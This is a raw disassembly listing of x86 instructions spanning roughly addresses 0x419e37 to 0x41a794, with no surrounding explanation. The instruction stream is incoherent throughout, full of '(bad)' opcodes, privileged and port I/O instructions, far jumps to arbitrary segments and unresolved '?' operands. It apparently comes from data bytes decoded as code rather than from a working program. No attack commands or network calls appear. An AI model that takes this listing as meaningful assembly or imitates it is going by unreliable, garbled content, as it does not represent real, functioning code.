  419e37:	inc    esi
  419e38:	int    0x9c
  419e3a:	pusha  
  419e3b:	cmc    
  419e3c:	sahf   
  419e3d:	pop    ecx
  419e3e:	sbb    esi,DWORD PTR ds:0x64ec0c82
  419e44:	dec    edx
  419e45:	mov    ds:0x38f3953d,eax
  419e4a:	push   es
  419e4b:	imul   BYTE PTR [ecx-0x15]
  419e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e4f:	rol    DWORD PTR [edi],1
  419e51:	pop    es
  419e52:	stos   DWORD PTR es:[edi],eax
  419e53:	stos   DWORD PTR es:[edi],eax
  419e54:	or     eax,DWORD PTR [edx]
  419e56:	dec    esi
  419e57:	js     0x419e40
  419e59:	lahf   
  419e5a:	adc    esp,DWORD PTR [esi-0x3a210d66]
  419e60:	jge    0x419e8c
  419e62:	cmp    DWORD PTR [eax+0xb38607f],edx
  419e68:	lods   al,BYTE PTR ds:[esi]
  419e69:	jnp    0x419e5d
  419e6b:	sbb    al,0x92
  419e6d:	mov    ebp,0xf5a36d32
  419e72:	inc    eax
  419e73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e74:	(bad)  
  419e76:	dec    esi
  419e77:	aam    0x69
  419e79:	mov    ds:0xe6a88ef,al
  419e7e:	xor    al,0xbb
  419e80:	pop    es
  419e81:	loope  0x419eb1
  419e83:	xchg   ebx,eax
  419e84:	sbb    DWORD PTR [ebp+0x320d535a],eax
  419e8a:	(bad)  
  419e8b:	push   ss
  419e8c:	iret   
  419e8d:	jl     0x419f02
  419e8f:	and    eax,DWORD PTR [ebx-0x24692f7b]
  419e95:	sbb    BYTE PTR [edi],cl
  419e97:	fs jle 0x419e57
  419e9a:	xor    al,BYTE PTR [eax]
  419e9c:	dec    ebp
  419e9d:	fld    TBYTE PTR [edi]
  419e9f:	xor    ecx,esp
  419ea1:	and    al,0x2f
  419ea3:	sbb    eax,0xda23803b
  419ea8:	sub    ch,BYTE PTR [edx+0x1d7bea85]
  419eae:	xchg   edx,eax
  419eaf:	push   es
  419eb0:	nop
  419eb1:	mov    ch,0x51
  419eb3:	shl    BYTE PTR [esi-0x1a],1
  419eb6:	test   DWORD PTR [esi],0xea9d0107
  419ebc:	jnp    0x419eff
  419ebe:	adc    eax,0x1275b6e6
  419ec3:	jmp    0x419e70
  419ec5:	jle    0x419eda
  419ec7:	in     eax,0xfe
  419ec9:	ret    0x83db
  419ecc:	adc    eax,0x4fe24adb
  419ed1:	xor    eax,0x88b1a441
  419ed6:	cs jne 0x419f21
  419ed9:	cmc    
  419eda:	std    
  419edb:	pop    ecx
  419edc:	aaa    
  419edd:	add    ch,BYTE PTR [ebx-0x3901bf54]
  419ee3:	jecxz  0x419f5d
  419ee5:	(bad)  
  419ee6:	fild   DWORD PTR [ecx]
  419ee8:	pop    esi
  419ee9:	jns    0x419f20
  419eeb:	mov    cl,0x14
  419eed:	fimul  WORD PTR [ecx-0x52]
  419ef0:	popf   
  419ef1:	and    BYTE PTR [ebp+0x39],dh
  419ef4:	sbb    BYTE PTR [edx],0x7c
  419ef7:	add    BYTE PTR [edi],0xb0
  419efa:	lds    ebp,FWORD PTR ds:0xf37926ce
  419f00:	jl     0x419f3a
  419f02:	mov    esi,DWORD PTR [ebp+0x4b]
  419f05:	xchg   ebx,eax
  419f06:	pusha  
  419f07:	jle    0x419ecc
  419f09:	xor    bl,BYTE PTR [edi+edx*4]
  419f0c:	jbe    0x419eba
  419f0e:	(bad)  
  419f0f:	icebp  
  419f10:	push   eax
  419f11:	cmp    esi,ebp
  419f13:	sub    ebx,ecx
  419f15:	setle  BYTE PTR [ebx-0x6f]
  419f19:	cmp    esp,ebp
  419f1b:	mov    al,ds:0xe34bd76f
  419f20:	inc    ebx
  419f21:	je     0x419f83
  419f23:	sahf   
  419f24:	(bad)  
  419f25:	jl     0x419ec8
  419f27:	(bad)  
  419f28:	sar    DWORD PTR [edx+0x35ac6de0],cl
  419f2e:	and    ebp,DWORD PTR [ebx+0x6f2cf18a]
  419f34:	fsub   DWORD PTR [edx-0x2a]
  419f37:	pop    eax
  419f38:	push   esp
  419f39:	popf   
  419f3a:	push   ss
  419f3b:	popa   
  419f3c:	cdq    
  419f3d:	in     al,dx
  419f3e:	push   ecx
  419f3f:	lahf   
  419f40:	rcr    esi,1
  419f42:	dec    ebp
  419f43:	jg     0x419f8c
  419f45:	mov    esi,0x78a1cd89
  419f4a:	pop    es
  419f4b:	mov    ecx,0x3d7a612
  419f50:	push   esi
  419f51:	scas   eax,DWORD PTR es:[edi]
  419f52:	push   ecx
  419f53:	xor    DWORD PTR [esi-0x48],esp
  419f56:	fldenv [esi-0x47]
  419f59:	gs call 0xbe1d:0x6742125
  419f61:	ror    DWORD PTR [edi],1
  419f63:	mov    eax,ds:0xe67abd4e
  419f68:	mov    ch,0xe
  419f6a:	out    dx,al
  419f6b:	sub    BYTE PTR [esi],ch
  419f6d:	mov    esi,0x88fb6f7a
  419f72:	int3   
  419f73:	cmp    dh,BYTE PTR [ecx+0x12]
  419f76:	aaa    
  419f77:	or     esp,DWORD PTR [edi-0x5cb3738a]
  419f7d:	mov    ds:0x518e3d6f,eax
  419f82:	in     eax,0xf9
  419f84:	mov    al,ds:0xddcaf9b6
  419f89:	je     0x41a00a
  419f8b:	add    BYTE PTR [esp+edi*8+0x18],bl
  419f8f:	ret    0xf83d
  419f92:	inc    ecx
  419f93:	fistp  QWORD PTR [ecx+edi*8]
  419f96:	and    cl,dl
  419f98:	and    esp,DWORD PTR ds:0xfeb65673
  419f9e:	retf   0x22d0
  419fa1:	adc    DWORD PTR [edi+0x5a],ebp
  419fa4:	mov    al,BYTE PTR [esi-0x2449332d]
  419faa:	mov    ds:0x43fe5368,al
  419faf:	xor    eax,0x7c28a0e
  419fb4:	int3   
  419fb5:	das    
  419fb6:	cmp    eax,DWORD PTR [edx+ebp*4-0x7e88fa10]
  419fbd:	sbb    eax,0xe15e263a
  419fc2:	push   ebx
  419fc3:	push   0x6fbfa0e6
  419fc8:	ret    0x14c0
  419fcb:	aam    0x84
  419fcd:	ja     0x419fd9
  419fcf:	pop    ecx
  419fd0:	mov    edx,0x3eb4ee17
  419fd5:	addr16 nop
  419fd7:	or     al,0xbd
  419fd9:	ret    
  419fda:	(bad)  
  419fdb:	std    
  419fdc:	or     DWORD PTR [ecx-0x7dd1fa],ecx
  419fe2:	xor    ecx,eax
  419fe4:	inc    ebx
  419fe5:	push   edx
  419fe6:	xor    eax,0xb6862ec3
  419feb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fec:	sahf   
  419fed:	mov    WORD PTR [edi-0x2c],ss
  419ff0:	dec    edi
  419ff1:	xchg   ch,dl
  419ff3:	mov    ebx,0xc2a680c2
  419ff8:	dec    ebx
  419ff9:	mov    ebp,DWORD PTR [ebp-0x68ce5b06]
  419fff:	pop    ds
  41a000:	jp     0x41a02b
  41a002:	jno    0x41a01a
  41a004:	xor    ah,dh
  41a006:	mov    bl,0xae
  41a008:	es mov cl,0xd7
  41a00b:	dec    eax
  41a00c:	mov    al,ds:0xcaaf3b12
  41a011:	fcomp  QWORD PTR [ebp-0x67a182c7]
  41a017:	jb     0x41a065
  41a019:	push   eax
  41a01a:	xchg   esp,eax
  41a01b:	add    DWORD PTR [ecx-0x6357c89e],ebx
  41a021:	xchg   edi,eax
  41a022:	retf   0xab57
  41a025:	pop    edx
  41a026:	push   esp
  41a027:	jge    0x41a000
  41a029:	mov    bl,0xaa
  41a02b:	std    
  41a02c:	xor    DWORD PTR [ebp-0x7e2f8a87],esi
  41a032:	mov    al,0xa7
  41a034:	push   cs
  41a035:	mov    al,0xc8
  41a037:	mov    eax,0x64da0c0d
  41a03c:	fstp   DWORD PTR [eax+edx*1+0x16ed691a]
  41a043:	add    DWORD PTR [esi+0x5273d50c],ebp
  41a049:	call   0x482d:0xfa59ca7e
  41a050:	xor    al,0xc1
  41a052:	into   
  41a053:	cs and ah,bh
  41a056:	push   ss
  41a057:	dec    esp
  41a058:	adc    DWORD PTR [ebp+0x511f0e80],eax
  41a05e:	int    0x7f
  41a060:	or     DWORD PTR [edx-0x1b319119],0x164d4467
  41a06a:	jne    0x41a064
  41a06c:	inc    edi
  41a06d:	jl     0x41a0ab
  41a06f:	push   0x5a385916
  41a074:	fwait
  41a075:	ds ins BYTE PTR es:[edi],dx
  41a077:	lahf   
  41a078:	dec    eax
  41a079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a07a:	pop    esp
  41a07b:	xlat   BYTE PTR ds:[ebx]
  41a07c:	xchg   edi,eax
  41a07d:	mov    eax,ds:0x3dd739ed
  41a082:	retf   0x959c
  41a085:	es inc ecx
  41a087:	mov    edx,0xf315a704
  41a08c:	sti    
  41a08d:	or     al,0x45
  41a08f:	mov    eax,DWORD PTR [ecx]
  41a091:	pusha  
  41a092:	leave  
  41a093:	xor    al,0xd
  41a095:	and    DWORD PTR [edi-0x2f],esp
  41a098:	or     dh,bl
  41a09a:	les    edi,FWORD PTR [edx-0x4d3951b3]
  41a0a0:	je     0x41a120
  41a0a2:	dec    ecx
  41a0a3:	and    bh,BYTE PTR [esi-0x23]
  41a0a6:	popa   
  41a0a7:	loopne 0x41a124
  41a0a9:	xor    bl,ah
  41a0ab:	inc    ebx
  41a0ac:	daa    
  41a0ad:	mov    eax,ds:0xc5ac9533
  41a0b2:	mov    ?,WORD PTR [esi]
  41a0b4:	jno    0x41a132
  41a0b6:	push   es
  41a0b7:	dec    esp
  41a0b8:	jmp    0x1337eac2
  41a0bd:	xchg   BYTE PTR [edx+0x43],dh
  41a0c0:	cmp    eax,0xcf86783f
  41a0c5:	inc    eax
  41a0c6:	xor    al,0xd3
  41a0c8:	inc    ecx
  41a0c9:	jge    0x41a0ab
  41a0cb:	fist   WORD PTR [eax]
  41a0cd:	ja     0x41a0a1
  41a0cf:	fild   QWORD PTR [edx]
  41a0d1:	pop    ecx
  41a0d2:	pop    eax
  41a0d3:	arpl   WORD PTR [ecx],dx
  41a0d5:	arpl   WORD PTR [eax],ax
  41a0d7:	and    ebx,ebp
  41a0d9:	and    al,0x49
  41a0db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0dc:	add    DWORD PTR [esi],esp
  41a0de:	aam    0x2
  41a0e0:	mov    ds:0xe1fd7481,al
  41a0e5:	xchg   edx,eax
  41a0e6:	shl    ecx,cl
  41a0e8:	xor    esi,DWORD PTR [esi+0x320f6c78]
  41a0ee:	jbe    0x41a16b
  41a0f0:	retf   
  41a0f1:	jmp    0x41a155
  41a0f3:	jne    0x41a0df
  41a0f5:	mov    ds:0x66261e8c,al
  41a0fa:	hlt    
  41a0fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0fc:	mov    ah,0xa
  41a0fe:	push   esi
  41a0ff:	xchg   ecx,eax
  41a100:	leave  
  41a101:	xchg   esp,eax
  41a102:	jl     0x41a120
  41a104:	test   eax,0x387aca2e
  41a109:	imul   esp,DWORD PTR [esi+0x46],0xe9a0d4e
  41a110:	add    BYTE PTR [edi+0x2f],dh
  41a113:	stos   BYTE PTR es:[edi],al
  41a114:	das    
  41a115:	les    ecx,FWORD PTR [edx-0x11]
  41a118:	outs   dx,DWORD PTR ds:[esi]
  41a119:	retf   0x59fd
  41a11c:	adc    eax,0x95fba229
  41a121:	and    al,0x72
  41a123:	push   DWORD PTR [edx-0x6b7977cf]
  41a129:	clc    
  41a12a:	pop    eax
  41a12b:	pop    ebp
  41a12c:	mov    dh,0x58
  41a12e:	mov    bl,0xd1
  41a130:	add    BYTE PTR [eax+0x18],al
  41a133:	imul   ecx,DWORD PTR [edi],0x4c
  41a136:	xchg   edx,eax
  41a137:	lea    ebx,[edx]
  41a139:	ss dec edx
  41a13b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a13c:	adc    al,0xf9
  41a13e:	enter  0x7c50,0x81
  41a142:	into   
  41a143:	bound  ebx,QWORD PTR [eax]
  41a145:	pop    ss
  41a146:	or     edx,DWORD PTR [edx+0x6f]
  41a149:	test   DWORD PTR ds:0xdfae38df,esp
  41a14f:	cmc    
  41a150:	fldcw  WORD PTR [edi-0x3b39a2b]
  41a156:	sbb    BYTE PTR [esi],dl
  41a158:	mov    ebp,0xc2c0139f
  41a15d:	add    al,0x9d
  41a15f:	dec    edi
  41a160:	sub    DWORD PTR [eax+edx*1-0x5d51ee8d],0xffffffb2
  41a168:	pop    ds
  41a169:	and    BYTE PTR [ecx],dl
  41a16b:	jl     0x41a1d9
  41a16d:	adc    edi,DWORD PTR [ebx]
  41a16f:	clc    
  41a170:	test   al,0xbf
  41a172:	sub    al,0xf1
  41a174:	dec    ebx
  41a175:	out    dx,al
  41a176:	mov    bh,0xab
  41a178:	xchg   edx,eax
  41a179:	mov    dl,0x6b
  41a17b:	push   0x76f7995a
  41a180:	aaa    
  41a181:	cmp    edx,ecx
  41a183:	cmp    al,0xd2
  41a185:	(bad)  
  41a186:	stos   BYTE PTR es:[edi],al
  41a187:	fmul   QWORD PTR ss:[ebp-0x32c6544b]
  41a18e:	add    DWORD PTR [esi+0x66],0xffffff9e
  41a192:	xchg   edi,eax
  41a193:	inc    eax
  41a194:	mov    bh,0x65
  41a196:	cwde   
  41a197:	add    esp,esp
  41a199:	and    eax,0x8c87dd09
  41a19e:	xor    BYTE PTR [eax+edx*2],ch
  41a1a1:	das    
  41a1a2:	pusha  
  41a1a3:	pop    edx
  41a1a4:	int3   
  41a1a5:	and    DWORD PTR [edi-0x5bfca481],esi
  41a1ab:	sbb    BYTE PTR [ecx-0x69],al
  41a1ae:	(bad)  
  41a1af:	mov    ds:0x92aa2f25,eax
  41a1b4:	cli    
  41a1b5:	std    
  41a1b6:	aas    
  41a1b7:	and    al,0xeb
  41a1b9:	sar    BYTE PTR [ebp-0x68b745af],0x8b
  41a1c0:	dec    cx
  41a1c2:	cdq    
  41a1c3:	mov    WORD PTR [edx+0x61],gs
  41a1c6:	lds    edi,FWORD PTR [esp+ebx*1-0x7010fd4c]
  41a1cd:	cli    
  41a1ce:	shl    edx,1
  41a1d0:	and    al,dl
  41a1d2:	enter  0x92f3,0xee
  41a1d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1d7:	mov    eax,ds:0x41f65c38
  41a1dc:	add    dl,ah
  41a1de:	xor    eax,esi
  41a1e0:	jbe    0x41a16f
  41a1e2:	dec    esp
  41a1e3:	pop    edi
  41a1e4:	in     eax,dx
  41a1e5:	mov    eax,0x4b1d2763
  41a1ea:	ret    
  41a1eb:	mov    al,ds:0xdbe99274
  41a1f0:	das    
  41a1f1:	jp     0x41a1d0
  41a1f3:	test   DWORD PTR [eax-0x2f118344],eax
  41a1f9:	nop
  41a1fa:	mov    cl,0x46
  41a1fc:	arpl   si,si
  41a1fe:	xchg   esp,eax
  41a1ff:	jo     0x41a218
  41a201:	mov    ds:0x8d8f993a,al
  41a206:	xor    esi,DWORD PTR [eax]
  41a208:	push   esp
  41a209:	nop
  41a20a:	add    DWORD PTR [edx],esi
  41a20c:	sti    
  41a20d:	dec    esi
  41a20e:	stc    
  41a20f:	jo     0x41a200
  41a211:	xor    BYTE PTR [ebx+0x557d8ba1],bl
  41a217:	mov    esi,0xb736a044
  41a21c:	mov    eax,0xa07a3b2a
  41a221:	cdq    
  41a222:	dec    ebx
  41a223:	sbb    bl,BYTE PTR [ecx+0x776d60f5]
	...
  41a3fd:	xchg   edi,edx
  41a3ff:	dec    ebp
  41a400:	jnp    0x41a45f
  41a402:	sti    
  41a403:	mov    bh,0xff
  41a405:	ds aad 0x54
  41a408:	ret    0x244d
  41a40b:	int3   
  41a40c:	mov    ebp,0x19a9b
  41a411:	and    BYTE PTR [edi],al
  41a413:	add    BYTE PTR [eax],al
  41a415:	and    BYTE PTR [ebx+edi*8],bl
  41a418:	inc    esi
  41a419:	rcl    DWORD PTR [edi+0x4d],0xbf
  41a41d:	and    ebp,DWORD PTR [eax]
  41a41f:	or     BYTE PTR [edi+0x42],ch
  41a422:	dec    ebx
  41a423:	sbb    bh,BYTE PTR [edx+0x51]
  41a426:	dec    ebx
  41a427:	adc    BYTE PTR [ebp-0x3406261],0x23
  41a42e:	xchg   esp,eax
  41a42f:	scas   eax,DWORD PTR es:[edi]
  41a430:	xchg   edx,eax
  41a431:	mov    eax,ds:0xc368545c
  41a436:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a438:	mov    dh,0x29
  41a43a:	jno    0x41a3ce
  41a43c:	addr16 loop 0x41a442
  41a43f:	daa    
  41a440:	xchg   BYTE PTR [ecx+0x47],bl
  41a443:	jbe    0x41a49d
  41a445:	xchg   esp,edx
  41a447:	or     DWORD PTR [edx],edi
  41a449:	fcmovnu st,st(1)
  41a44b:	sti    
  41a44c:	iret   
  41a44d:	add    DWORD PTR [edi-0x9],ebx
  41a450:	cs cmc 
  41a452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a453:	push   ebp
  41a454:	push   0xb07dddda
  41a459:	mov    ecx,0xec9b174f
  41a45e:	(bad)  
  41a45f:	mov    es,WORD PTR [ecx]
  41a461:	mov    al,0x4f
  41a463:	sbb    BYTE PTR [edx-0x7838e567],0x72
  41a46a:	add    cl,dl
  41a46c:	pop    eax
  41a46d:	push   es
  41a46e:	cdq    
  41a46f:	bound  edx,QWORD PTR [ebp+0x35]
  41a472:	hlt    
  41a473:	(bad)  
  41a474:	mov    ebp,cs
  41a476:	cmp    dl,BYTE PTR [edx]
  41a478:	jmp    0x62a98c78
  41a47d:	jl     0x41a45e
  41a47f:	adc    cl,BYTE PTR [ebp+0x30010e12]
  41a485:	or     ebx,DWORD PTR [ecx+0x46f6e3b3]
  41a48b:	mov    eax,0x1b16ec28
  41a490:	cmp    bl,BYTE PTR [ebx-0x211cae84]
  41a496:	add    bh,ah
  41a498:	inc    ecx
  41a499:	or     al,BYTE PTR [eax-0x3a]
  41a49c:	inc    esp
  41a49d:	xchg   ebx,eax
  41a49e:	rcr    esp,0x2c
  41a4a1:	int    0xa6
  41a4a3:	test   DWORD PTR [ebx],ecx
  41a4a5:	xor    bh,bl
  41a4a7:	add    ebx,edi
  41a4a9:	inc    edi
  41a4aa:	jge    0x41a4f3
  41a4ac:	cli    
  41a4ad:	xchg   edx,eax
  41a4ae:	mov    ch,0xe
  41a4b0:	or     al,0x61
  41a4b2:	jmp    DWORD PTR [esi+0x9204fa]
  41a4b8:	ja     0x41a47a
  41a4ba:	mov    esp,0x2c3f77d4
  41a4bf:	xchg   esi,eax
  41a4c0:	cmp    dh,BYTE PTR [esi-0x1df676ad]
  41a4c6:	mov    bh,BYTE PTR [esi+0x4d581865]
  41a4cc:	rol    DWORD PTR [ebx+edi*1-0x31],cl
  41a4d0:	or     BYTE PTR [ebx],cl
  41a4d2:	into   
  41a4d3:	dec    esp
  41a4d4:	and    DWORD PTR [esi+edi*4-0x50a48d51],0x763b49ec
  41a4df:	fwait
  41a4e0:	mov    esi,0x99b8d44
  41a4e5:	pushf  
  41a4e6:	pop    esp
  41a4e7:	popa   
  41a4e8:	pusha  
  41a4e9:	xchg   edx,eax
  41a4ea:	inc    edi
  41a4eb:	cmp    ch,BYTE PTR [eax+0x1551da42]
  41a4f1:	outs   dx,BYTE PTR ds:[esi]
  41a4f2:	shl    ebp,0xbc
  41a4f5:	pop    edx
  41a4f6:	jp     0x41a501
  41a4f8:	ror    BYTE PTR [eax],1
  41a4fa:	and    cl,BYTE PTR [eax+0x24]
  41a4fd:	pop    edi
  41a4fe:	sar    DWORD PTR [esi],cl
  41a500:	and    DWORD PTR [edi],0xed4584d5
  41a506:	(bad)  
  41a508:	out    0x7a,al
  41a50a:	lds    edx,FWORD PTR [esi]
  41a50c:	iret   
  41a50d:	push   esp
  41a50e:	and    eax,0x9e133ea0
  41a513:	sub    bh,BYTE PTR [eax]
  41a515:	fild   QWORD PTR [ecx+0x79f732de]
  41a51b:	inc    ecx
  41a51c:	xor    al,BYTE PTR [ebx+0x3e6bc11]
  41a522:	or     eax,0xbc1f0d36
  41a527:	addr16 out dx,eax
  41a529:	or     bl,ch
  41a52b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a52c:	sbb    eax,0x4b19c70a
  41a531:	cmp    eax,0x872b3c1b
  41a536:	add    DWORD PTR gs:[ebx+0x20],ebx
  41a53a:	cwde   
  41a53b:	(bad)  
  41a53c:	jg     0x41a507
  41a53e:	and    dl,dh
  41a540:	sub    eax,0x9108f0c3
  41a545:	ds js  0x41a543
  41a548:	jnp    0x41a55c
  41a54a:	push   esi
  41a54b:	sub    al,0x74
  41a54d:	xor    ch,BYTE PTR [esi-0x7cadab8d]
  41a553:	mov    ebx,gs
  41a555:	xchg   DWORD PTR ds:0x7b1754c0,ebp
  41a55b:	mov    al,ds:0x73a90d4a
  41a560:	xchg   ebp,eax
  41a561:	mov    dl,BYTE PTR [ecx-0x31]
  41a564:	adc    DWORD PTR [ecx-0x5e],ecx
  41a567:	jae    0x41a5c3
  41a569:	and    eax,0x83a4b7ad
  41a56e:	dec    edi
  41a56f:	loopne 0x41a5bc
  41a571:	cmp    ebx,esi
  41a573:	xchg   DWORD PTR [ebx-0x657f3905],edx
  41a579:	mov    ecx,?
  41a57b:	in     eax,dx
  41a57c:	mov    esi,0x69a76ede
  41a581:	pop    edi
  41a582:	sbb    edx,DWORD PTR [ebp+0x86131a4]
  41a588:	in     al,0x21
  41a58a:	jae    0x41a55a
  41a58c:	xchg   esi,eax
  41a58d:	jge    0x41a55c
  41a58f:	pop    esi
  41a590:	enter  0x25c8,0xa8
  41a594:	push   esi
  41a595:	jmp    0x53791b04
  41a59a:	fmul   st,st(7)
  41a59c:	dec    ebp
  41a59d:	ss jo  0x41a57c
  41a5a0:	adc    DWORD PTR [ebx+0x55],ebp
  41a5a3:	pop    edx
  41a5a4:	jnp    0x41a52d
  41a5a6:	fmul   DWORD PTR [edx-0x79a1d1cd]
  41a5ac:	cdq    
  41a5ad:	mov    al,0x63
  41a5af:	imul   esp,eax,0xfffffffb
  41a5b2:	jae    0x41a560
  41a5b4:	inc    edx
  41a5b5:	pop    edx
  41a5b6:	ret    
  41a5b7:	sbb    bh,BYTE PTR [ebp-0x7fe1d410]
  41a5bd:	xchg   ebx,eax
  41a5be:	inc    esi
  41a5bf:	adc    al,0x69
  41a5c1:	mov    dl,0x49
  41a5c3:	xor    BYTE PTR [esi-0x59405e61],0x7f
  41a5ca:	adc    eax,0x9387078a
  41a5cf:	inc    edi
  41a5d0:	xchg   dh,cl
  41a5d2:	add    al,0x45
  41a5d4:	scas   al,BYTE PTR es:[edi]
  41a5d5:	stos   BYTE PTR es:[edi],al
  41a5d6:	sbb    ah,ch
  41a5d8:	out    dx,eax
  41a5d9:	jecxz  0x41a596
  41a5db:	fstp   TBYTE PTR [ebx-0x42]
  41a5de:	sub    al,0xfa
  41a5e0:	call   0xd612a518
  41a5e5:	xor    BYTE PTR [ebp-0x58],dh
  41a5e8:	pop    es
  41a5e9:	mov    ds:0x13893700,al
  41a5ee:	xchg   ecx,eax
  41a5ef:	mov    esi,0xd04a863c
  41a5f4:	cdq    
  41a5f5:	cmc    
  41a5f6:	cmp    DWORD PTR [ebx-0x7d],edi
  41a5f9:	ss mov esi,0x2f21297c
  41a5ff:	mov    esp,0xa108fe7
  41a604:	xchg   BYTE PTR ds:0xc1d4a7e5,ah
  41a60a:	fdiv   DWORD PTR [ebp+0x4b60eb2e]
  41a610:	rol    al,0xe3
  41a613:	mov    bh,0x26
  41a615:	jmp    eax
  41a617:	(bad)  
  41a619:	pop    ebx
  41a61a:	mov    ch,BYTE PTR [esi-0x4f]
  41a61d:	pop    esi
  41a61e:	mov    dh,0x85
  41a620:	mul    BYTE PTR [edx-0x19]
  41a623:	aad    0xd3
  41a625:	sub    al,0x55
  41a627:	iret   
  41a628:	sub    ebp,edx
  41a62a:	push   edi
  41a62b:	sub    BYTE PTR [ebx+0xdb6e5ce],cl
  41a631:	cdq    
  41a632:	sbb    DWORD PTR [ebx-0x25e71683],ebx
  41a638:	call   0xf093:0xe85f562b
  41a63f:	rol    BYTE PTR [edx],1
  41a641:	outs   dx,BYTE PTR ds:[esi]
  41a642:	xor    cl,BYTE PTR [eax]
  41a644:	mov    eax,0x8c827f68
  41a649:	cmp    ebx,ebp
  41a64b:	fisubr DWORD PTR [esi-0x24458106]
  41a651:	pop    eax
  41a652:	je     0x41a5f2
  41a654:	mov    edi,edi
  41a656:	mov    eax,ds:0x67e1262a
  41a65b:	sahf   
  41a65c:	xchg   esp,eax
  41a65d:	push   esp
  41a65e:	jle    0x41a5ee
  41a660:	data16 fucomp st(7)
  41a663:	into   
  41a664:	imul   ebx,DWORD PTR [edi+0x36d47add],0xf
  41a66b:	mov    ss,edx
  41a66d:	adc    DWORD PTR [esi+0xb04383e],ebx
  41a673:	iret   
  41a674:	fld    QWORD PTR [esi+0x3e7927c8]
  41a67a:	aad    0x9a
  41a67c:	push   0x36
  41a67e:	sub    ebp,esi
  41a680:	dec    ecx
  41a681:	lods   eax,DWORD PTR ds:[esi]
  41a682:	cmp    al,0x75
  41a684:	outs   dx,DWORD PTR ds:[esi]
  41a685:	inc    esi
  41a686:	iret   
  41a687:	jmp    0x99d0:0xa96f965a
  41a68e:	mov    dl,0x47
  41a690:	lds    ebp,FWORD PTR [esi-0x791c4d0d]
  41a696:	dec    ecx
  41a697:	test   BYTE PTR [eax+0x39],bl
  41a69a:	lods   eax,DWORD PTR ds:[esi]
  41a69b:	(bad)  
  41a69c:	(bad)  
  41a69d:	(bad)  
  41a69e:	repz xchg esp,eax
  41a6a0:	les    edx,FWORD PTR [eax-0x33]
  41a6a3:	pushf  
  41a6a4:	outs   dx,BYTE PTR ds:[esi]
  41a6a5:	aam    0x76
  41a6a7:	xchg   edx,eax
  41a6a8:	pop    ebp
  41a6a9:	xor    BYTE PTR [ebx],ah
  41a6ab:	mov    al,0x99
  41a6ad:	and    bl,0x33
  41a6b0:	inc    ecx
  41a6b1:	xor    dx,WORD PTR [edi+0x3855c657]
  41a6b8:	ficom  DWORD PTR [edx+eiz*2]
  41a6bb:	sbb    eax,0xf32275a1
  41a6c0:	ds aas 
  41a6c2:	pop    edx
  41a6c3:	jmp    0x41a6b2
  41a6c5:	add    esp,DWORD PTR [eax]
  41a6c7:	inc    ecx
  41a6c8:	mov    ecx,0x8ac6f830
  41a6cd:	inc    esp
  41a6ce:	and    ch,cl
  41a6d0:	adc    edx,DWORD PTR [edi-0x40]
  41a6d3:	retf   0xbdad
  41a6d6:	shl    ch,0xd2
  41a6d9:	jmp    0x41a69d
  41a6db:	sub    edi,DWORD PTR [esi+0x56deccc9]
  41a6e1:	inc    ecx
  41a6e2:	and    eax,0xb8863943
  41a6e7:	xchg   ebp,eax
  41a6e8:	mov    bh,0xe2
  41a6ea:	ins    BYTE PTR es:[edi],dx
  41a6eb:	std    
  41a6ec:	adc    al,0x73
  41a6ee:	xchg   ebx,eax
  41a6ef:	mov    eax,0x8a13ef14
  41a6f4:	xor    eax,0xd58c916a
  41a6fa:	and    DWORD PTR [esi],0x74
  41a6fd:	clc    
  41a6fe:	add    BYTE PTR [ebp-0x78],dh
  41a701:	sti    
  41a702:	out    0x3a,eax
  41a704:	sub    dl,cl
  41a706:	jae    0x41a75d
  41a708:	jae    0x41a6be
  41a70a:	add    DWORD PTR [edx],eax
  41a70c:	test   DWORD PTR [ecx-0x5622d9c],ebx
  41a712:	xchg   edx,eax
  41a713:	pusha  
  41a714:	sbb    esp,DWORD PTR [ebx]
  41a716:	push   ds
  41a717:	stos   DWORD PTR es:[edi],eax
  41a718:	jmp    0x3f8c59bf
  41a71d:	imul   edi,DWORD PTR [ecx+ecx*1-0x1b],0xffffff97
  41a722:	test   ah,bl
  41a724:	jmp    0x2f7c:0x90bd435e
  41a72b:	sub    al,0x7e
  41a72d:	ja     0x41a764
  41a72f:	inc    esp
  41a730:	shr    BYTE PTR [esi],1
  41a732:	xlat   BYTE PTR ds:[ebx]
  41a733:	pop    edx
  41a734:	addr16 leave 
  41a736:	(bad)  
  41a737:	hlt    
  41a738:	scas   eax,DWORD PTR es:[edi]
  41a739:	arpl   WORD PTR [esi],di
  41a73b:	sub    al,0xc6
  41a73d:	xor    ch,BYTE PTR [ebx+ecx*2-0x65]
  41a741:	gs dec edi
  41a743:	xchg   esp,eax
  41a744:	rol    BYTE PTR ds:0x4e0aade2,0xdd
  41a74b:	lea    eax,fs:[ebx]
  41a74e:	dec    ebx
  41a74f:	push   cs
  41a750:	scas   eax,DWORD PTR es:[edi]
  41a751:	push   ebp
  41a752:	mov    edx,0x4612be36
  41a757:	(bad)  
  41a758:	mov    dl,0x5b
  41a75a:	cli    
  41a75b:	(bad)  
  41a75d:	test   al,0x27
  41a75f:	call   DWORD PTR [esi]
  41a761:	aaa    
  41a762:	cwde   
  41a763:	out    dx,al
  41a764:	(bad)  
  41a765:	fwait
  41a766:	retf   
  41a767:	(bad)  
  41a768:	das    
  41a769:	pop    es
  41a76a:	or     al,0x23
  41a76c:	cld    
  41a76d:	cmp    BYTE PTR [eax-0x33],0x1c
  41a771:	fwait
  41a772:	jno    0x41a72b
  41a774:	dec    esp
  41a775:	sbb    ecx,esp
  41a777:	cmp    cl,ch
  41a779:	sub    eax,0x99e3dc6c
  41a77e:	sub    DWORD PTR [eax],edi
  41a780:	es jp  0x41a7e9
  41a783:	jg     0x41a745
  41a785:	std    
  41a786:	jno    0x41a7a5
  41a788:	dec    ecx
  41a789:	jmp    0x5da9:0xe9b6a554
  41a790:	inc    ebx
  41a791:	mov    cl,0x14
  41a793:	xchg   ebx,eax
  41a794:	jb     0x41a79d
